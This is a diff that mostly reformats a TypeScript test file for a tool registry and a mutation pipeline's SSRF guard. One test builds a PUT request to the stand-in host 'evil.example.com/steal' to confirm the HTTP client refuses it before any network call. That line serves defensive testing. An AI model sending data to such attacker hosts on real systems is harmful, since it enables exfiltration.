@@ -158,7 +158,8 @@ describe("buildNativeToolRegistry", () => {
 
     let count = 0;
     for await (const entry of journal.queryEntries({ type: "evidence_pointer" })) {
-      if (entry.type === "evidence_pointer" && entry.payload.gateTag === "result.submit") count += 1;
+      if (entry.type === "evidence_pointer" && entry.payload.gateTag === "result.submit")
+        count += 1;
     }
     expect(count).toBe(1);
   });
@@ -317,7 +318,11 @@ describe("HIGH #2 adversarial-review fix — tracker.apply/observability.apply r
         // request that reaches this far (i.e. survived the SSRF preflight)
         // is answered synthetically, so these tests never depend on real
         // network I/O succeeding or timing out.
-        sendRequest: async () => ({ status: 200, headers: {}, bodyText: '{"appliedRevision":"rev-from-fake-transport"}' }),
+        sendRequest: async () => ({
+          status: 200,
+          headers: {},
+          bodyText: '{"appliedRevision":"rev-from-fake-transport"}',
+        }),
       });
   }
 
@@ -388,7 +393,9 @@ describe("HIGH #2 adversarial-review fix — tracker.apply/observability.apply r
     for await (const entry of journal.queryEntries({ type: "remote_operation_record" })) {
       entries.push(entry as { payload: { operationId: string; status: string } });
     }
-    const forThisOp = entries.filter((e) => e.payload.operationId === (plan as { idempotencyKey: string }).idempotencyKey);
+    const forThisOp = entries.filter(
+      (e) => e.payload.operationId === (plan as { idempotencyKey: string }).idempotencyKey,
+    );
     expect(forThisOp.map((e) => e.payload.status)).toEqual(["pending", "recorded"]);
   });
 
@@ -412,7 +419,11 @@ describe("HIGH #2 adversarial-review fix — tracker.apply/observability.apply r
       // origin (never the connection's own allowlisted base URL) — the
       // mutation pipeline's own GatewayHttpClient must refuse this before
       // any network call, exactly as it would for a read tool.
-      buildRequest: () => ({ url: new URL("https://evil.example.com/steal"), method: "PUT", hasPrecondition: true }),
+      buildRequest: () => ({
+        url: new URL("https://evil.example.com/steal"),
+        method: "PUT",
+        hasPrecondition: true,
+      }),
       parseResponse: () => {
         networkCallCount += 1;
         return { appliedRevision: "should-never-happen" };
@@ -471,6 +482,9 @@ describe("HIGH #2 adversarial-review fix — tracker.apply/observability.apply r
     const plan = buildValidPlan({ idempotencyKey: "observability-apply-op" }, connection.id);
     const result = await tool?.handler({ plan });
     expect(result?.isError).toBeFalsy();
-    expect(JSON.parse(result?.content[0]?.text ?? "{}")).toEqual({ status: "recorded", appliedRevision: "rev-obs-1" });
+    expect(JSON.parse(result?.content[0]?.text ?? "{}")).toEqual({
+      status: "recorded",
+      appliedRevision: "rev-obs-1",
+    });
   });
 });
